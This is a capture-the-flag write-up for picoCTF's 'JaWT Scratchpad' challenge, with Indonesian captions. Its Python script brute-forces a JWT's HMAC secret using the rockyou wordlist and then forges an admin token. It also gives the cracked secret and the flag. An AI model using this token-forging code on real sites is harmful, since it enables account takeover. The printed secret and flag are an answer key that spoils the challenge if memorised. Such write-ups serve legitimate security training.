<h1>JaWT Scratchpad</h1>
<h3>Description</h3>
<p>Check the admin scratchpad! https://jupiter.challenges.picoctf.org/problem/58210/ or http://jupiter.challenges.picoctf.org:58210</p>
<h3>Solution</h3>

<p>Login sesuai nama user yang diminta</p>

```python3
import base64
import hmac
import hashlib
import json

jwt_encode = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam90In0.LKK1d2cdN4MEnCQ5YGDdPv818z4ADGu26H9OrLLBnB8"

def header_data(header):
    return base64.urlsafe_b64encode(header.encode()).decode().rstrip("=")
header_base64 = header_data('{"typ":"JWT","alg":"HS256"}')

def payload_data(payload):
    return base64.urlsafe_b64encode(payload.encode()).decode().rstrip("=")
payload_base64 = payload_data('{"user":"jot"}')

message = f"{header_base64}.{payload_base64}".encode()
with open("../Tools/rockyou.txt", "r",errors="ignore") as file:
    for line in file:
        secret_key = line.strip('\n')
        signature = hmac.new(secret_key.encode(), message, hashlib.sha256).digest()
        signature_base64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")
        result = f"{header_base64}.{payload_base64}.{signature_base64}"
        if result == jwt_encode:
            print(f"Secret key found: {secret_key} - Success!")
            payload_base64 = payload_data('{"user":"admin"}')
            message = f"{header_base64}.{payload_base64}".encode()
            signature = hmac.new(secret_key.encode(), message, hashlib.sha256).digest()
            signature_base64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")
            result = f"{header_base64}.{payload_base64}.{signature_base64}"
            print(result)
            break
        else:
            pass

```

<p>Secret : <b>ilovepico</b>, salin jwt ganti ke jwt di link challenge</p>
<h3>Flag</h3>
<pre>
picoCTF{jawt_was_just_what_you_thought_44c752f5}
</pre>
